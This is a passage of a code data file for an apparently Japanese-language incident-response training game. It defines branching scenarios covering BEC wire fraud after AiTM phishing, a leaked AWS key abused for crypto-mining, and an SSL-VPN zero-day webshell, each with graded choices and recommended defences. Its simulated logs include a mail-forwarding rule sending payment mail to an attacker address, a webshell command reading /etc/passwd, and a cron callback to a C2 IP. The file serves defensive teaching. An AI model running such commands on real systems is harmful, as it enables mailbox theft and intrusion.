      aitm_02_mailbox_audit: {
        id: 'aitm_02_mailbox_audit',
        phase: 'Phase 2: 不正メール転送ルール・改ざんの徹底調査 (T+00:20)',
        title: '潜伏用インボックスルールの発見と財務連携',
        description: 'セッション失効に成功。直ちにExchange監査ログを検索したところ、攻撃者が侵入直後の1分間に「invoice」「bank」「transfer」を含む受信メールを「ごみ箱へ移動し、外部攻撃者アドレスへ転送する」隠しルールを作成していたことが判明しました。',
        severity: 'high',
        situationSummary: '攻撃者は来週予定されていた大型機械の購入代金（1億5,000万円）の請求書スレッドを盗み見ていました。',
        telemetryLogs: [
          { timestamp: '14:04:10', source: 'Exchange Audit', level: 'CRITICAL', message: 'New-InboxRule: Name=".", Condition="Subject contains \'Payment\'", Action="ForwardTo fake-audit@secure-cloud-mail.com, DeleteMessage"' },
          { timestamp: '14:22:00', source: 'Mailbox Trace', level: 'INFO', message: 'Target thread identified: "RE: Final Invoice - Project Alpha $1.5M USD"' }
        ],
        choices: [
          {
            id: 'c2_purge_rule_finance_freeze',
            label: '不正ルールの即時抹消、財務部への緊急警告発令（送金口座変更の全件電話確認義務付け）',
            actionType: 'containment',
            timeCostMinutes: 15,
            description: 'PowerShellで全社メールボックスの不審ルールを洗い出して削除。財務担当者に「メールのみによる口座変更要求の処理を全面凍結」させる。',
            tacticalRationale: 'BEC詐欺の急所。攻撃者の目的は「偽の口座変更メール」を送って1.5億円を着服すること。送金直前の人的二重確認（コールバック確認）で確実に防ぐ。',
            isOptimal: true,
            impact: { spread: -5, exfiltration: -10, downtime: 5, trust: +15 },
            logOutput: [
              '[EXCHANGE] Remove-InboxRule completed. All shadow rules removed.',
              '[FINANCE ALERT] CFO / Treasury: SWIFT transfer freeze enacted.',
              '[VENDOR CONTACT] Vendor CFO reached via known fixed landline: Confirmed no bank change was requested.'
            ],
            nextNodeId: 'aitm_03_terminal_saved_s'
          }
        ]
      },

      aitm_02_invoice_divert: {
        id: 'aitm_02_invoice_divert',
        phase: 'Phase 2: 偽請求書送付と送金実行の危機 (T+00:45)',
        title: 'CFOになりすました偽口座送金指示',
        description: 'セッションが生きたままだったため、攻撃者はCFO本人になりすまし、財務担当者へ「取引先が銀行口座を緊急変更したため、本日15時までに新口座（香港HSBC）へ1.5億円を振り込むように」と指示メールを送信しました。財務担当者が送金承認ボタンを押そうとしています。',
        severity: 'critical',
        situationSummary: '残り時間15分。銀行の当日送金締切が迫る。',
        telemetryLogs: [
          { timestamp: '14:45:10', source: 'Outlook Web', level: 'CRITICAL', message: 'Sent email: "URGENT: Remittance Account Update - Wire to Hong Kong account"' },
          { timestamp: '14:46:00', source: 'Treasury System', level: 'ALERT', message: 'Wire Transfer Batch #8812 Pending 2nd Approval ($1,500,000 USD)' }
        ],
        choices: [
          {
            id: 'c2b_physical_intercept',
            label: '財務部執務室へ直接駆け込み、送金承認操作を物理的に制止・メガバンクへ緊急送金保留連絡',
            actionType: 'containment',
            timeCostMinutes: 5,
            description: '電子通知ではなく対面で担当者を止め、銀行の外国為替デスクへ送金停止要請を行う。',
            tacticalRationale: '泥縄だが実務上極めて有効。サイバー攻撃が金銭詐取へ直結する瞬間は、物理的・人間的な介入が最後の防波堤となる。',
            isOptimal: true,
            impact: { spread: 0, exfiltration: 10, downtime: 10, trust: +5 },
            logOutput: [
              '[INCIDENT CHIEF] Intercepted wire transfer physically at Treasury terminal.',
              '[BANK FOREX] Mitsubishi UFJ / SMBC Desk: Remittance flagged as suspected fraud.',
              '[RESULT] $1.5M USD transaction cancelled successfully.'
            ],
            nextNodeId: 'aitm_03_terminal_narrow_escape_a'
          },
          {
            id: 'c2b_send_chat',
            label: '社内Teamsチャットで「詐欺メールの可能性がある」と財務担当者にメッセージを送る',
            actionType: 'communication',
            timeCostMinutes: 20,
            description: 'チャットで連絡し、気付いてもらうのを待つ。',
            tacticalRationale: '不十分。担当者はCFOからの緊急メールに焦っており、Teamsを見ていない可能性が高い。結果として送金ボタンが押され着金してしまう。',
            impact: { spread: 0, exfiltration: 40, downtime: 20, trust: -50 },
            logOutput: [
              '[TEAMS] Message sent... unread for 12 minutes.',
              '[BANK API] SWIFT MT103 wire transfer transmitted to offshore account.',
              '[DISASTER] Funds withdrawn within 8 minutes of arrival in Hong Kong.'
            ],
            nextNodeId: 'aitm_03_terminal_heist_f'
          }
        ]
      },

      aitm_03_terminal_saved_s: {
        id: 'aitm_03_terminal_saved_s',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Sランク】AiTMフィッシング完全封殺と不正送金阻止',
        description: 'セッションCookieの即時無効化、隠し転送ルールの粛清、そして財務プロセスの人的二重確認により、1億5,000万円の詐取を水際で完全阻止しました。またFIDO2パスキー認証の全社展開へと繋げました。',
        severity: 'contained',
        situationSummary: '金銭被害: ゼロ。機密流出: なし。BEC攻撃を完璧に撃退。',
        telemetryLogs: [
          { timestamp: '16:00:00', source: 'CISO Office', level: 'INFO', message: 'All Executive accounts migrated to FIDO2 Hardware Security Keys (YubiKey).' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'S',
          title: '次世代認証脅威への模範的対応',
          summary: '「セッションハイジャックにはトークン失効」「隠しインボックスルールの特定」「口座変更の別経路確認」というBEC対策の黄金原則を完遂しました。',
          financialEstimate: '被害損害額: 0円 / 詐欺着服阻止額: 1億5,000万円',
          legalImpact: '警察庁サイバー警察局へIoC提供。国際送金詐欺グループ摘発の証拠に貢献。',
          complianceStatus: 'ISO/IEC 27001 / Zero Trust 実装完了',
          recommendedPractices: [
            'SMSや認証アプリのワンタイムパスワード(TOTP)はAiTMリバースプロキシで突破されるため、FIDO2/パスキーを導入する',
            '口座変更依頼メールを受信した際は、メール記載の電話番号ではなく「既存の登録電話番号」へ必ず折り返し確認する',
            '定期的に全ユーザーの「メール転送ルール一覧 (Get-InboxRule)」を自動監査するスクリプトを運用する'
          ]
        }
      },

      aitm_03_terminal_narrow_escape_a: {
        id: 'aitm_03_terminal_narrow_escape_a',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Aランク】間一髪の送金阻止とセッション管理の教訓',
        description: 'パスワード変更だけではセッションが切れないという落とし穴に直面したものの、執務室への突入と銀行連携により1.5億円の流出を1分前に阻止しました。',
        severity: 'contained',
        situationSummary: '金銭被害はギリギリ回避。危機管理意識の向上。',
        telemetryLogs: [
          { timestamp: '16:15:00', source: 'Audit Team', level: 'INFO', message: 'Conditional Access Policy updated to force token lifetime limit (1 hour).' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'A',
          title: '現場の瞬発力で守り切った薄氷の勝利',
          summary: '技術的なトークン失効が遅れたものの、人的な緊急停止措置が功を奏しました。技術と人間の二重防壁の重要性を証明しました。',
          financialEstimate: '被害損害額: 0円（送金手数料キャンセル費用のみ）',
          legalImpact: '金融機関との信頼関係強化。',
          complianceStatus: '良好',
          recommendedPractices: [
            'アカウント侵害時は「パスワード変更」と「セッション・リフレッシュトークン失効」を必ずワンセットで実行する'
          ]
        }
      },

      aitm_03_terminal_heist_f: {
        id: 'aitm_03_terminal_heist_f',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Fランク】1億5,000万円の資金流出と回収不能',
        description: 'チャット連絡の遅れにより送金が実行され、資金は香港のペーパーカンパニー口座を経由して即座に暗号資産へ資金洗浄されました。資金の回収可能性はほぼゼロです。',
        severity: 'critical',
        situationSummary: '巨額損失発生。CFOおよび担当役員の懲戒処分、監査役調査開始。',
        telemetryLogs: [
          { timestamp: '16:30:00', source: 'Interpol', level: 'CRITICAL', message: 'Funds dispersed across 40+ decentralized crypto mixers. Recovery untraceable.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'F',
          title: '古典的かつ現代的なBEC詐欺の完全被弾',
          summary: 'セッションCookieの仕組みを知らず、送金阻止の現場緊急性が欠如していたことが最悪の損害に直結しました。',
          financialEstimate: '金銭損失: 1億5,000万円（全額回収不能）',
          legalImpact: '取引先への債務不履行、特別損失計上、株主総会での経営責任追及。',
          complianceStatus: '内部統制上の「重大な不備」認定',
          recommendedPractices: [
            '高額送金には電子署名または対面/肉声によるクロスチェックを内部統制ルールに組み込む',
            'フィッシング耐性のある認証（FIDO2）への移行を最優先課題とする'
          ]
        }
      }
    }
  },

  {
    id: 'scenario_cloud_supply_chain',
    title: 'サプライチェーン侵害 & クラウド秘密鍵漏洩',
    subtitle: '実在モデル: GitHub公開リポジトリへのAWS IAMキー誤コミット & 大規模不正マイニング事件',
    difficulty: '初級 (基礎トリアージ)',
    category: 'Cloud & Supply Chain',
    estimatedTime: '12分',
    initialNodeId: 'cloud_01_alert',
    initialMetrics: {
      spread: 15,
      exfiltration: 20,
      downtime: 5,
      trust: 90,
    },
    briefing: {
      targetOrganization: 'BtoB SaaS スタートアップ企業（契約社数 800社）',
      discoveredAlert: '開発者が誤ってGitリポジトリへAWS IAM長期クレデンシャル（AdministratorAccess）をコミット。わずか45秒後にボットにより悪用開始。',
      incidentOfficer: 'DevSecOpsリードエンジニア',
      immediateObjective: '流出したクラウドクレデンシャルの瞬時無効化、不正リソースの駆逐、顧客DBスナップショットの流出防止。',
    },
    imagePath: '/src/assets/images/scenario_cloud_breach_1793333674112.jpg',
    nodes: {
      cloud_01_alert: {
        id: 'cloud_01_alert',
        phase: 'Phase 1: クラウド認証情報流出と悪用検知 (T+00:00)',
        title: 'GitHub公開リポジトリへのIAMアクセスキー誤コミット',
        description: '若手エンジニアがオープンソース公開用のコードに誤って `.env` の本番AWSアクセスキー（AKIA...）を含めてプッシュ。45秒後、CloudTrailに「オレゴン、サンパウロ、フランクフルト等の複数リージョンで巨大なGPUインスタンス（g5.12xlarge）が一斉起動された」という異常アラートが殺到しました。',
        severity: 'critical',
        situationSummary: 'マイニングボットが自動展開中。毎時数十万円のクラウド利用料が発生中。',
        telemetryLogs: [
          { timestamp: '16:01:45', source: 'GitHub Push', level: 'WARN', message: 'Public commit 4a8f9c pushed with AWS_ACCESS_KEY_ID="AKIA..."' },
          { timestamp: '16:02:30', source: 'AWS CloudTrail', level: 'CRITICAL', message: 'RunInstances initiated by AKIA... in us-west-2, sa-east-1, eu-central-1 (32x g5.12xlarge)' },
          { timestamp: '16:03:00', source: 'AWS GuardDuty', level: 'CRITICAL', message: 'CryptoCurrency:EC2/BitcoinTool.B!DNS detected' }
        ],
        choices: [
          {
            id: 'c1_deactivate_key_iam',
            label: 'AWSマネジメントコンソール/CLIから流出アクセスキーを即座に「Deactivate (無効化)」し、IAM権限境界を更新',
            actionType: 'containment',
            timeCostMinutes: 3,
            description: '削除ではなくまず無効化することで攻撃者の全APIコールを即時遮断しつつ、監査ログ追跡の基点を維持する。',
            tacticalRationale: 'クラウドセキュリティ初動の鉄則。git commitを取り消してもボットはすでにキーを保管しているため、AWS側でキーを無効化する以外に止める術はない。',
            isOptimal: true,
            impact: { spread: -15, exfiltration: -10, downtime: 0, trust: +5 },
            logOutput: [
              '[AWS IAM] aws iam update-access-key --access-key-id AKIA... --status Inactive',
              '[CLOUDTRAIL] Subsequent API calls from attacker returned: 403 InvalidClientTokenId.',
              '[SOC] Attacker API calls halted.'
            ],
            nextNodeId: 'cloud_02_terminate_resources'
          },
          {
            id: 'c1_git_revert_only',
            label: 'GitHub上で慌てて git commit --amend して該当ファイルを消して強制プッシュする',
            actionType: 'remediation',
            timeCostMinutes: 15,
            description: 'リポジトリから秘密鍵の記載を消去する。',
            tacticalRationale: '典型的な初歩的ミス。ボットはプッシュされた瞬間にキーを吸い上げて自らのサーバーに保存しているため、GitHubから消してもキー自体は有効なままであり、被害が拡大し続ける。',
            impact: { spread: 30, exfiltration: 25, downtime: 10, trust: -20 },
            logOutput: [
              '[GIT] Commit amended and pushed with --force.',
              '[CLOUDTRAIL] Attacker continues spawning EC2 instances.',
              '[AWS COST] Unbilled EC2 charges reached $12,400 in 20 minutes.'
            ],
            nextNodeId: 'cloud_02_cost_explosion'
          }
        ]
      },

      cloud_02_terminate_resources: {
        id: 'cloud_02_terminate_resources',
        phase: 'Phase 2: 不正リソースの駆逐とデータ侵害調査 (T+00:15)',
        title: '不正インスタンスの全リージョン一括終了とS3監査',
        description: 'アクセスキー無効化により攻撃者の新規APIコールを遮断。次に起動されたマイニング用EC2インスタンスの全破棄と、S3バケット内の顧客機密データにアクセスされたかどうかのCloudTrail監査を行います。',
        severity: 'high',
        situationSummary: '起動されたインスタンス群の終了スクリプト実行。S3バケットのGetObjectログを検証中。',
        telemetryLogs: [
          { timestamp: '16:08:00', source: 'AWS CLI Script', level: 'INFO', message: 'Terminating 32 unauthorized EC2 instances across 4 regions.' },
          { timestamp: '16:12:30', source: 'S3 Server Access Log', level: 'ALERT', message: 'ListBuckets executed by compromised key. S3 GetObject on "prod-customer-db-dump" attempted.' }
        ],
        choices: [
          {
            id: 'c2_s3_log_verify_rotate',
            label: 'CloudTrail EventHistoryでS3へのアクセス結果を照合、全IAMロールのローテーションと一時的認証情報(IAM Roles / OIDC)への移行',
            actionType: 'forensics',
            timeCostMinutes: 30,
            description: 'データが実際にダウンロードされたかバイト数を確認。長期アクセスキーを全廃し、GitHub Actions用にはOIDC短時間トークンを採用する。',
            tacticalRationale: '根本原因の恒久排除。静的な長期キー(AKIA)の使用をやめ、OpenID Connect(OIDC)による短命トークンに切り替えることで再発をゼロにできる。',
            isOptimal: true,
            impact: { spread: -10, exfiltration: -10, downtime: 5, trust: +15 },
            logOutput: [
              '[S3 AUDIT] Bucket Policy denied GetObject due to KMS customer managed key restriction!',
              '[FORENSICS] No customer data exfiltrated. KMS blocked unauthorized decryption.',
              '[DEVSECOPS] GitHub Actions AWS credentials migrated to OIDC assume-role-with-web-identity.'
            ],
            nextNodeId: 'cloud_03_terminal_secured_s'
          }
        ]
      },

      cloud_02_cost_explosion: {
        id: 'cloud_02_cost_explosion',
        phase: 'Phase 2: 請求額爆発とアカウント凍結の危機 (T+01:00)',
        title: '数千万円規模の不正請求と顧客データベースの窃取',
        description: 'Gitの修正だけで安心していたため、攻撃者はAWS Organizations内の別アカウントへも権限昇格を実行。さらにS3内のバックアップダンプファイルをまるごとダウンロードし、社用Slackに「漏洩を公開されたくなければビットコインを払え」と投稿してきました。',
        severity: 'critical',
        situationSummary: 'クラウド請求額3,000万円突破。顧客800社の全データ流出。',
        telemetryLogs: [
          { timestamp: '17:05:00', source: 'AWS Billing Alert', level: 'CRITICAL', message: 'Account credit limit exceeded: $210,000 USD' },
          { timestamp: '17:10:00', source: 'S3 Data Transfer', level: 'CRITICAL', message: 'Egress: 2.4 TB transferred to external IP' }
        ],
        choices: [
          {
            id: 'c2b_aws_support_compromise',
            label: 'AWSサポートへ緊急「Compromised Account」チケット起票・ルートアカウントによる全権限剥奪と警察相談',
            actionType: 'containment',
            timeCostMinutes: 60,
            description: 'AWS Trust & Safetyチームと連携し、不正請求の救済交渉とインフラの完全隔離を要請する。',
            tacticalRationale: '手遅れ寸前だが唯一の生存策。AWSは適切な初動と報告があれば不正マイニングの請求を一部免除してくれる場合がある。',
            isOptimal: true,
            impact: { spread: 0, exfiltration: 10, downtime: 40, trust: -30 },
            logOutput: [
              '[AWS SUPPORT] Case opened: Severity "Critical - System Down". AWS SecOps froze compromised IAM entities.',
              '[BILLING] Concession review initiated under AWS compromised account policy.'
            ],
            nextNodeId: 'cloud_03_terminal_recovery_c'
          }
        ]
      },

      cloud_03_terminal_secured_s: {
        id: 'cloud_03_terminal_secured_s',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Sランク】電光石火のクラウド封じ込めとDevSecOps刷新',
        description: 'キー無効化を3分で完了させたことで不正インスタンスの利用料は数千円で抑えられ、KMS暗号化ポリシーによって顧客データへのアクセスも防御されました。さらに長期キーを全廃してOIDCへ移行したことで、組織のセキュリティ体制が一段上に引き上げられました。',
        severity: 'contained',
        situationSummary: '金銭被害: わずか数千円（AWS免除対象）。顧客データ漏洩: ゼロ。',
        telemetryLogs: [
          { timestamp: '18:00:00', source: 'Security Architecture', level: 'INFO', message: 'Git pre-commit secret scanning hooks (gitleaks) mandated for all dev repositories.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'S',
          title: 'DevSecOps時代の模範的クラウド初動',
          summary: '「Git修正ではなくIAMキー無効化」「多層防御としてのKMS暗号化」「OIDCによる長期キーの廃止」という現代クラウドセキュリティの三種の神器を実践しました。',
          financialEstimate: '被害損害額: 約8,000円（EC2一時稼働費・AWSサポートにて全額免除認定）',
          legalImpact: 'データ流出なしがフォレンジックで証明され、法定義務違反なし。',
          complianceStatus: 'AWS Well-Architected Security Pillar 準拠',
          recommendedPractices: [
            'IAM長期アクセスキー(AKIA...)は原則使用禁止とし、IAMロールおよびOIDC連携に一本化する',
            'Gitクライアントに `gitleaks` や `trufflehog` を導入し、コミット前にシークレットを自動検知してブロックする',
            'S3バケットにはKMS CMK（カスタマー管理キー）による暗号化を施し、IAM管理者であっても復号を制限する多層防御を敷く'
          ]
        }
      },

      cloud_03_terminal_recovery_c: {
        id: 'cloud_03_terminal_recovery_c',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Cランク】初動の無理解が招いた巨額請求と情報漏洩',
        description: 'Gitの修正だけで解決したと誤認した結果、数千万円のクラウド請求とS3からの顧客全件データ流出を招きました。AWSサポートの救済で請求の一部は減免されたものの、全顧客への謝罪と賠償が発生しました。',
        severity: 'critical',
        situationSummary: '重大インシデント。顧客離脱、全社的信用失墜。',
        telemetryLogs: [
          { timestamp: '19:00:00', source: 'Executive Council', level: 'CRITICAL', message: 'Emergency shareholder meeting scheduled to report $200k financial write-off.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'C',
          title: 'Gitとクラウド認証の混同による悲劇',
          summary: '「公開されたキーは即時にクラウド側で無効化しなければならない」という初歩原則を怠ったことが致命傷となりました。',
          financialEstimate: '被害損害額: 約1億2,000万円（不正利用料残債 + 顧客損害賠償・お詫び金）',
          legalImpact: '個人情報保護法に基づく是正命令、全顧客への個別通知。',
          complianceStatus: '重大な統制不備',
          recommendedPractices: [
            '「コードから消してもクラウド上で生きている」ことを全開発者に肝に銘じさせる',
            'CloudTrailおよびGuardDutyのクリティカル通知を即時Slack/PagerDutyへエスカレーションする仕組みを義務付ける'
          ]
        }
      }
    }
  },

  {
    id: 'scenario_vpn_zeroday',
    title: 'SSL-VPNゼロデイ脆弱性悪用 & 境界防御突破インシデント',
    subtitle: '実在モデル: SSL-VPN (Ivanti / Fortinet) ゼロデイ認証バイパス & DMZ WebShell常駐事件',
    difficulty: '中級 (実務CSIRT)',
    category: 'Zero-Day & Perimeter',
    estimatedTime: '15分',
    initialNodeId: 'vpn_01_alert',
    initialMetrics: {
      spread: 20,
      exfiltration: 10,
      downtime: 15,
      trust: 90,
    },
    briefing: {
      targetOrganization: '地方自治体・基幹公共インフラ連携機構（職員1,800名）',
      discoveredAlert: '外部SSL-VPNゲートウェイ（VPN-GW-01）において、未認証の任意コード実行(RCE)脆弱性を突いた攻撃IPからのHTTP POST通信と、DMZ内リバースプロキシへの異常通信を検知。',
      incidentOfficer: 'SOCアナリスト兼インシデントハンドラー',
      immediateObjective: 'ゼロデイ侵害されたVPN機器の切り離し、内部Webシェルの特定と排除、Active Directoryへのピボット遮断。',
    },
    imagePath: '/src/assets/images/scenario_vpn_zeroday_1793335053211.jpg',
    nodes: {
      vpn_01_alert: {
        id: 'vpn_01_alert',
        phase: 'Phase 1: 境界突破アラートと初期トリアージ (T+00:00)',
        title: 'SSL-VPNゲートウェイにおける未認証RCEの検知',
        description: 'JPCERT/CCおよびベンダーから緊急セキュリティ勧告が出ているSSL-VPN機器（CVSS 9.8）に対し、中国/東欧系IPから難読化されたBase64ペイロードを含むPOSTリクエストが着信。機器背後のDMZサーバー `/var/www/html/tunnel.jsp` にWebシェルが作成された形跡があります。',
        severity: 'critical',
        situationSummary: '攻撃者はすでにVPN機器を通過し、DMZ内のLinuxリバースプロキシでコマンドを実行可能な状態。',
        telemetryLogs: [
          { timestamp: '23:14:02', source: 'Palo Alto Perimeter FW', level: 'CRITICAL', message: 'Exploit attempt: CVE-2025-XXXX (Auth Bypass RCE) against VPN-GW-01 from 185.87.201.44' },
          { timestamp: '23:14:30', source: 'DMZ Web Server', level: 'ALERT', message: 'New file created: /var/www/html/themes/tunnel.jsp (SHA256: e3b0c442... Godzilla WebShell)' },
          { timestamp: '23:15:10', source: 'Linux Auditd', level: 'WARN', message: 'tomcat spawned bash -c "whoami; ip route; cat /etc/passwd"' }
        ],
        choices: [
          {
            id: 'c1_vpn_isolate_pcap',
            label: '上流ルーターでの該当VPN-GWへのインバウンド遮断、DMZサーバーのメモリダンプ採取およびWebシェル隔離',
            actionType: 'containment',
            timeCostMinutes: 10,
            description: '上流BGP/スイッチで当該VPN機器宛の通信を緊急ドロップ。内部DMZサーバーは電源を落とさずメモリを採取した上でWebシェルプロセスをkillする。',
            tacticalRationale: '最善の対応。外部からの攻撃通信パイプラインを即座に断ち切り、同時にWebシェルの通信セッションとメモリ展開されたペイロードを完全保全できる。',
            isOptimal: true,
            impact: { spread: -10, exfiltration: -5, downtime: 15, trust: +5 },
            logOutput: [
              '[BORDER ROUTER] BGP Flowspec rule injected: Drop all traffic to VPN-GW-01 public IP.',
              '[SOC] External attacker session timed out (TCP RST sent).',
              '[DMZ-01] Volatile memory dumped to forensic USB. Process PID 8812 (tunnel.jsp) killed.'
            ],
            nextNodeId: 'vpn_02_lateral_sweep'
          },
          {
            id: 'c1_vpn_reboot_only',
            label: 'VPN機器の電源スイッチを再投入（リブート）して様子を見る',
            actionType: 'containment',
            timeCostMinutes: 5,
            description: '機器を再起動し、一時的な不具合か確認する。',
            tacticalRationale: '悪手。VPN機器を再起動してもDMZに設置されたWebシェルは永続化されており、外部から再接続されるか内部cronでC2通信が継続する。',
            impact: { spread: 25, exfiltration: 20, downtime: 5, trust: -15 },
            logOutput: [
              '[VPN-GW-01] System reboot completed. Services restarted.',
              '[DMZ-01] Cron job executed: /var/tmp/.daemon connecting to 91.240.118.52 on port 443.',
              '[AD LOG] NTLM relay attack initiated from DMZ-01 towards Internal Domain Controller!'
            ],
            nextNodeId: 'vpn_02_reboot_failure'
          }
        ]
      },

      vpn_02_lateral_sweep: {
        id: 'vpn_02_lateral_sweep',
        phase: 'Phase 2: 内部ピボット調査とActive Directory防衛 (T+00:30)',
        title: '内部VLANへの侵入痕跡スキャンとパッチ適用',
        description: '外部通信の遮断によりWebシェルは停止。採取したメモリダンプの解析により、攻撃者が内部Active Directoryや職員業務用ファイルサーバーを探索する前に遮断できたことが確認されました。ベンダーの緊急セキュリティパッチを適用し、ゼロトラスト型SASE/ZTNAへの切り替えを検討します。',
        severity: 'high',
        situationSummary: '侵入はDMZサーバー1台で食い止めに成功。内部セグメントへの汚染なし。',
        telemetryLogs: [
          { timestamp: '23:45:00', source: 'Internal Core FW', level: 'INFO', message: 'No unauthorized SYN packets from DMZ-01 to Internal VLAN (10.10.0.0/16).' },
          { timestamp: '23:50:20', source: 'SIEM Log Correlation', level: 'INFO', message: 'Credential store on DMZ-01 contained no domain admin hashes.' }
        ],
        choices: [
          {
            id: 'c2_patch_credential_rotation',
            label: 'VPN機器の完全初期化・ファームウェア最新パッチ適用、全ユーザーVPN認証情報の強制リセット',
            actionType: 'remediation',
            timeCostMinutes: 45,
            description: '機器設定をバックアップからクリーンリストアして脆弱性修正パッチを適用。漏洩疑いのあるVPNパスワードを全件更新する。',
            tacticalRationale: '恒久対策の徹底。ゼロデイ脆弱性を根本修復し、念のため全ユーザーの認証情報をローテーションすることで再侵入経路を完全に塞ぐ。',
            isOptimal: true,
            impact: { spread: -10, exfiltration: -5, downtime: 10, trust: +15 },
            logOutput: [
              '[VPN-GW-01] Factory reset executed. Firmware patched to v12.4.1 (CVE addressed).',
              '[IDP] 1,800 user VPN passwords expired. Forced MFA re-enrollment enacted.',
              '[SECURITY SCAN] Vulnerability re-check: CVE-2025-XXXX fixed successfully.'
            ],
            nextNodeId: 'vpn_03_terminal_mastered_s'
          }
        ]
      },

      vpn_02_reboot_failure: {
        id: 'vpn_02_reboot_failure',
        phase: 'Phase 2: 内部ピボット成功と住民情報DBアクセス (T+01:00)',
        title: 'Webシェル経由の内部Active Directory制圧',
        description: 'VPNを単に再起動したため、DMZ内のWebシェルが生きたまま放置されました。攻撃者はDMZから内部ネットワークへNTLMリレー攻撃を行い、ドメイン管理者のハッシュを奪取。住民情報データベースへクエリを投げ始めました。',
        severity: 'critical',
        situationSummary: '境界防御完全突破。基幹データベースから個人情報が抽出中。',
        telemetryLogs: [
          { timestamp: '00:15:00', source: 'MSSQL Audit', level: 'CRITICAL', message: 'SELECT * FROM Resident_Master executed by DOMAIN\\admin_svc' },
          { timestamp: '00:18:30', source: 'Firewall Egress', level: 'CRITICAL', message: 'High volume outbound SSL stream to untrusted ASN (Bulgaria IP)' }
        ],
        choices: [
          {
            id: 'c2b_pull_datacenter_internet',
            label: 'データセンター回線の物理的切断・警察サイバー捜査隊への緊急通報と公表準備',
            actionType: 'containment',
            timeCostMinutes: 30,
            description: 'これ以上のデータ流出を止めるため、インターネット接続を完全物理遮断する。',
            tacticalRationale: '重傷だが止血処置。すでに一部データは流出したが、全件持ち出しとランサムウェア暗号化による住民サービス停止は防げる。',
            isOptimal: true,
            impact: { spread: 0, exfiltration: 30, downtime: 60, trust: -30 },
            logOutput: [
              '[DATA CENTER] WAN link disconnected physically.',
              '[POLICE] Cyber Crime Division on-site at municipal office.',
              '[STATUS] Citizen data export stopped at 4,200 records.'
            ],
            nextNodeId: 'vpn_03_terminal_compromised_c'
          }
        ]
      },

      vpn_03_terminal_mastered_s: {
        id: 'vpn_03_terminal_mastered_s',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Sランク】境界ゼロデイの電光石火封じ込めと多層防御成功',
        description: '上流ルーターでの通信遮断とDMZサーバーのメモリ保全を即座に行い、ゼロデイ攻撃をDMZ内の単一プロセスで完全に封殺しました。内部ネットワークへの一切の足がかりを与えず、翌日にはパッチ適用と認証情報ローテーションを完遂しました。',
        severity: 'contained',
        situationSummary: '情報流出: ゼロ。内部侵入: なし。ゼロデイ攻撃を完全撃退。',
        telemetryLogs: [
          { timestamp: '02:00:00', source: 'CSIRT Command', level: 'INFO', message: 'Incident closed. Zero-Trust Network Access (ZTNA) migration accelerated.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'S',
          title: 'ゼロデイ攻撃に対する模範的CSIRT対応',
          summary: '「上流ネットワークでの早期遮断」「電源を切らないメモリフォレンジック保全」「全認証情報の迅速な更新」を的確に完遂しました。',
          financialEstimate: '被害損害額: 約120万円（緊急パッチ検証・外部監査費のみ）/ 想定被害回避額: 約3.5億円',
          legalImpact: '住民情報・個人データの漏洩ゼロ。行政機関の信頼を維持。',
          complianceStatus: '政府統一基準 / NIST CSF 2.0 評価: Tier 4',
          recommendedPractices: [
            '境界型SSL-VPN機器はゼロデイの主標的となるため、ゼロトラストアクセス(ZTNA)への移行を推進する',
            '機器の単なる再起動はWebシェルや永続化メカニズムを排除できないことを徹底周知する',
            'DMZから内部ネットワークへの通信ポリシーは厳格なステートフルインスペクションで遮断しておく'
          ]
        }
      },

      vpn_03_terminal_compromised_c: {
        id: 'vpn_03_terminal_compromised_c',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Cランク】再起動ミスによる住民情報流出と社会的引責',
        description: '「再起動すれば治る」という安易な判断により、Webシェル経由でActive Directoryが乗っ取られ住民情報4,200件が流出しました。回線切断により全滅は免れたものの、自治体首長による記者会見とお詫び金対応が発生しました。',
        severity: 'critical',
        situationSummary: '住民データ一部流出。全庁ネットワーク停止3日間。',
        telemetryLogs: [
          { timestamp: '03:00:00', source: 'City Hall Press', level: 'CRITICAL', message: 'Emergency press conference held regarding citizen data leak.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'C',
          title: '境界型セキュリティの脆弱性と初動ミスの代償',
          summary: '再起動によってログやメモリ証拠を一部破損し、DMZから内部へのラテラルムーブメントを許してしまいました。',
          financialEstimate: '被害損害額: 約8,500万円（お詫び状送付・原因究明・セキュリティ刷新）',
          legalImpact: '個人情報保護委員会からの是正勧告、住民説明会の開催。',
          complianceStatus: '要改善',
          recommendedPractices: [
            '「疑わしい機器の再起動」はフォレンジック証拠を破壊するため、専門チーム到着まで厳禁とする',
            'ネットワーク機器の重要セキュリティ勧告は24時間以内に適用判断を行う運用体制を組む'
          ]
        }
      }
    }
  },

  {
    id: 'scenario_insider_threat',
    title: '特権管理者によるソースコード＆顧客データ大量持ち出し',
    subtitle: '実在モデル: 大手ハイテク企業 退職予定エンジニアによる特権悪用・知的財産コード不正持ち出し事件',
    difficulty: '上級 (インシデントコマンダー)',
    category: 'Insider Threat',
    estimatedTime: '15分',
    initialNodeId: 'insider_01_alert',
    initialMetrics: {
      spread: 10,
      exfiltration: 35,
      downtime: 5,
      trust: 95,
    },
    briefing: {
      targetOrganization: 'AI・FinTech クラウドSaaS企業（社員450名）',
      discoveredAlert: '来月末で競合他社へ転職予定のインフラ主任（Domain Admin / AWS Admin権限保持）が、深夜02時に社用PCから未承認の私用Google Driveへ45GBの暗号化ZIPをアップロード中。',
      incidentOfficer: 'CISO兼コンプライアンス法務委員長',
      immediateObjective: 'データ持ち出しの阻止、証拠隠滅の防止（法的証拠の保全）、不正競争防止法に基づく差止請求準備。',
    },
    imagePath: '/src/assets/images/scenario_insider_threat_1793335053388.jpg',
    nodes: {
      insider_01_alert: {
        id: 'insider_01_alert',
        phase: 'Phase 1: 深夜のDLP異常アラート発報 (T+00:00)',
